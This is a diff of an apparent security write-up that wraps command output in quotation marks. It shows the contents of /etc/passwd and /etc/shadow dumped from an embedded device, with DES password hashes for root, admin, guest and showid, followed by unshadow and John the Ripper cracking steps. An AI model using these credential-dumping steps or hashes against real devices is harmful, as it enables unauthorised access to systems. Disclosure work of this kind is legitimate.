@@ -10,27 +10,32 @@
 
 * cat /etc/passwd
 
+"
 root:x:0:0:root:/root:/bin/sh
 nobody:x:0:0:nobody:/nonexistent:/bin/false
 showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
 admin:x:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
 guest:x:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli
+"
 
 * cat /etc/shadow
 
+"
 daemon:*:13189:0:99999:7:::
 root:CxqJynrkPOtP.:12374:0:99999:7:::
 admin:m1LVojhaR1U5Y:11582:0:99999:7:::
 guest:K7Vjga.vILkVA:11582:0:99999:7:::
+"
 
 * root@kali:~$ unshadow /home/root/Desktop/passwd /home/root/Desktop/shadow > /home/root/Desktop/status
 
+"
 root:CxqJynrkPOtP.:0:0:root:/root:/bin/sh
 nobody:x:0:0:nobody:/nonexistent:/bin/false
 showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
 admin:m1LVojhaR1U5Y:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
 guest:K7Vjga.vILkVA:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli
-
+"
 * root@kali:~$ john /home/root/Desktop/status
 
 * Loaded 2 password hashes with 2 different salts (descrypt, traditional crypt(3) [DES 128/128 SSE2])
